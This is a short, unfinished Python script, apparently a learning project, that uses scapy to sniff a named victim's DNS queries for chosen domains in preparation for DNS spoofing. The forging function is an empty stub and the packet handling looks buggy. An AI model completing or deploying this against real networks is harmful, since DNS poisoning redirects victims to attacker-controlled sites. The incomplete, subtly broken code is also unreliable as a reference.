from scapy.all import *

# victimNotInvolved = False
# dnsQueryFromVictim = True


def getDnsMsg(ipVictim,urlsToSpoof):

    while(True):
        pkt = sniff(count=1)

        if DNS in pkt:
            dnsQueryFromVictim, goodUrl = getDnsMsgType(pkt,ipVictim,urlsToSpoof)
            return (pkt, dnsQueryFromVictim, goodUrl)
    
def getDnsMsgType(pkt,ipVictim,urlsToSpoof):
    
    if pkt[IP].src == ipVictim: 
        if urlsToSpoof:
            goodUrl = bool(pkt[IP][DNS].qd.qname in urlsToSpoof)
        else: 
            goodUrl = True
        return (True, goodUrl)
    
    else: 
        return (False, False)

def dnsSpoofVictimQuery(pkt,goodUrl):

    

    return

def dnsPoison():

    ipVictim = input("Victim IP address")
    urlsToSpoof = input("URLs to spoof").split()

    (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(ipVictim,urlsToSpoof)
    
    if dnsQueryFromVictim:
        dnsSpoofVictimQuery(pkt,goodUrl)
    else:
        pass

    return